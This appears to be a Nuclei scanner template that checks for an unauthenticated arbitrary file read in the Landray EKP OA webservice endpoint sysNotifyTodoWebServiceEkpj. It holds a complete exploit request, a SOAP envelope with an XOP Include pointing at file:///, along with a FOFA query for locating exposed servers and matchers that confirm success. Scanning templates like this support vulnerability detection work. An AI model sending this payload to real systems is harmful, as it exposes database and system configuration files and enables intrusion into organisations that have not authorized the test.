id: landray-ekp-sysNotifyTodoWebServiceEkpj-fileread
info:
  name: 蓝凌 EKP sysNotifyTodoWebServiceEkpj - fileread
  author: leadlife
  severity: high
  description: 蓝凌 OA webservice 服务 sysNotifyTodoWebServiceEkpj 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="Com_Parameter"
    hunter-query: demo
    tips: 响应为 base64 编码
    repair:
    version:
  tags: 2024,fileread,landray,oa

http:
  - raw:
      - |
        POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
        Connection: close
        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
        SOAPAction: ""
        Accept-Encoding: gzip, deflate

        ------4upt9dwdca8rtwq9osuz
        Content-Disposition: form-data; name="a"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
            <web:getAllTodoId>
                <arg0>
                    <beginTimeStamp>a</beginTimeStamp>
                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></count>
                </arg0>
            </web:getAllTodoId>
        </soapenv:Body>
        </soapenv:Envelope>
        ------4upt9dwdca8rtwq9osuz--

    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'soap','Unmarshalling')
          - contains(header,'text/xml')
        condition: and
